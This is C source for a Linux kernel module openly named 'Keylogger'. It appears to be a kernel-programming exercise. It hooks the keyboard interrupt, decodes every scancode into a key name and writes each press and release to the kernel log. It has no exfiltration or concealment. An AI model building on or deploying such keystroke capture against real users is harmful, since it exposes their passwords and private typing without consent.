// SPDX-License-Identifier: GPL-2.0+
#include "keylogger.h"


DEFINE_MUTEX(keyboard_mutex);
DEFINE_SPINLOCK(keyboard_spinlock);

static int windex	= -1;
static int rindex	= -1;

static struct key_press keys[CB_SIZE];

static const struct usb_device_id usb_module_id_table[2] = {
	{ USB_INTERFACE_INFO(
			USB_INTERFACE_CLASS_HID,
			USB_INTERFACE_SUBCLASS_BOOT,
			USB_INTERFACE_PROTOCOL_KEYBOARD) },
	{}
};
MODULE_DEVICE_TABLE(usb, usb_module_id_table);

// helpers
static int is_key_pressed(unsigned int scancode)
{
	return !(scancode & RELEASED_MASK);
}

struct scan_code codes[] = {
	{0x0, "NULL", PRESSED},
	{0x1, "escape", PRESSED},
	{0x2, "1", PRESSED},
	{0x3, "2", PRESSED},
	{0x4, "3", PRESSED},
	{0x5, "4", PRESSED},
	{0x6, "5", PRESSED},
	{0x7, "6", PRESSED},
	{0x8, "7", PRESSED},
	{0x9, "8", PRESSED},
	{0xa, "9", PRESSED},
	{0xb, "0 zero", PRESSED},
	{0xc, "-", PRESSED},
	{0xd, "=", PRESSED},
	{0xe, "backspace", PRESSED},
	{0xf, "tab", PRESSED},
	{0x10, "q", PRESSED},
	{0x11, "w", PRESSED},
	{0x12, "e", PRESSED},
	{0x13, "r", PRESSED},
	{0x14, "t", PRESSED},
	{0x15, "y", PRESSED},
	{0x16, "u", PRESSED},
	{0x17, "i", PRESSED},
	{0x18, "o", PRESSED},
	{0x19, "p", PRESSED},
	{0x1e, "a", PRESSED},
	{0x1f, "s", PRESSED},
	{0x20, "d", PRESSED},
	{0x21, "f", PRESSED},
	{0x22, "g", PRESSED},
	{0x23, "h", PRESSED},
	{0x24, "j", PRESSED},
	{0x25, "k", PRESSED},
	{0x26, "l", PRESSED},
	{0x27, ";", PRESSED},
	{0x28, "' (single quote)", PRESSED},
	{0x29, "` (back tick)", PRESSED},
	{0x2a, "left shift", PRESSED},
	{0x2b, "\\", PRESSED},
	{0x2c, "z", PRESSED},
	{0x2d, "x", PRESSED},
	{0x2e, "c", PRESSED},
	{0x2f, "v", PRESSED},
	{0x30, "b", PRESSED},
	{0x31, "n", PRESSED},
	{0x32, "m", PRESSED},
	{0x33, ",", PRESSED},
	{0x34, ".", PRESSED},
	{0x35, "/", PRESSED},
	{0x36, "right shift"},
	{0x37, "(keypad) *"},
	{0x38, "left alt", PRESSED,},
	{0x39, "space", PRESSED},
	{0x3a, "CapsLock", PRESSED},
	{0x3b, "F1", PRESSED},
	{0x3c, "F2", PRESSED},
	{0x3d, "F3", PRESSED},
	{0x3e, "F4", PRESSED},
	{0x3f, "F5", PRESSED},
	{0x40, "F6", PRESSED},
	{0x41, "F7", PRESSED},
	{0x42, "F8", PRESSED},
	{0x43, "F9", PRESSED},
	{0x44, "F10", PRESSED},
	{0x45, "NumberLock", PRESSED},
	{0x46, "ScrollLock", PRESSED},
	{0x47, "(keypad) 7", PRESSED},
	{0x48, "(keypad) 8", PRESSED},
	{0x49, "(keypad) 9", PRESSED},
	{0x4a, "(keypad) -", PRESSED},
	{0x4b, "(keypad) 4", PRESSED},
	{0x4c, "(keypad) 5", PRESSED},
	{0x4d, "(keypad) 6", PRESSED},
	{0x4e, "(keypad) +", PRESSED},
	{0x4f, "(keypad) 1", PRESSED},
	{0x50, "(keypad) 2", PRESSED},
	{0x51, "(keypad) 3", PRESSED},
	{0x52, "(keypad) 0", PRESSED},
	{0x53, "(keypad) .", PRESSED},
	{0x57, "F11", PRESSED},
	{0x58, "F12", PRESSED},
};

// misc ops
static ssize_t misc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
{
	return 0;
}

static int misc_open(struct inode *inode, struct file *file)
{
	return 0;
}

static int misc_release(struct inode *inode, struct file *file)
{
	return 0;
}

static struct file_operations fops = {
	.read		= misc_read,
	.open		= misc_open,
	.release	= misc_release
};

static struct miscdevice keyboard_device = {
	.minor		= MISC_DYNAMIC_MINOR,
	.name		= "valmpani-keyboard",
	.fops		= &fops,
};

// irq section
static int get_code_index(u8 scancode)
{
	for (int i = 0; i < 82; i++) {
		if (codes[i].scancode == scancode)
			return i;
	}
	return -1;
}

static irqreturn_t keyboard_handler(int irq, void *dev_id)
{
	u8		scancode = inb(KEYBOARD_PORT);
	u8		dummy_code;
	int		pressed = is_key_pressed(scancode);
	unsigned long	flags;
	int		index = 0;

	spin_lock_irqsave(&keyboard_spinlock, flags);
	dummy_code = pressed ? scancode : scancode - 0x80;
	index = get_code_index(dummy_code);
	if (index == -1)
		goto err;
	struct scan_code code = codes[index];
	pr_info("scancode = 0x%X (%u) %s name: %s\n", scancode, scancode, pressed == 1 ? "pressed" : "released", code.name);
	spin_unlock_irqrestore(&keyboard_spinlock, flags);

	return IRQ_HANDLED;
err:
	pr_info("Key is out of range\n");
	spin_unlock_irqrestore(&keyboard_spinlock, flags);
	return IRQ_NONE;
}

static int driver_irq_reg(void)
{
	int ret;
	ret = request_irq(PL2_IRQ, &keyboard_handler, IRQF_SHARED, "Keyloggerrrrr", &keys);
	if (ret < 0) {
		pr_err("Failed to register interrupt request handler\n");
		return ret;
	}
	pr_info("Return value %d\n", ret);
	return 0;
}

static void driver_irq_unregister(void)
{
	free_irq(PL2_IRQ, &keys);
}


static int __init main(void)
{
	int err;
	for (int i = 0; i < CB_SIZE; i++) {
		keys[i].name = NULL;
	}
	err = driver_irq_reg();
	if (err) {
		pr_err("IRQ failed\n");
		return -EFAULT;
	}
	misc_register(&keyboard_device);
	return 0;
}

static void __exit cleanup(void)
{
	driver_irq_unregister();
	misc_deregister(&keyboard_device);
	pr_info("cleanup\n");
}

MODULE_AUTHOR("valmpanis");
MODULE_DESCRIPTION("Keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

module_init(main);

module_exit(cleanup);
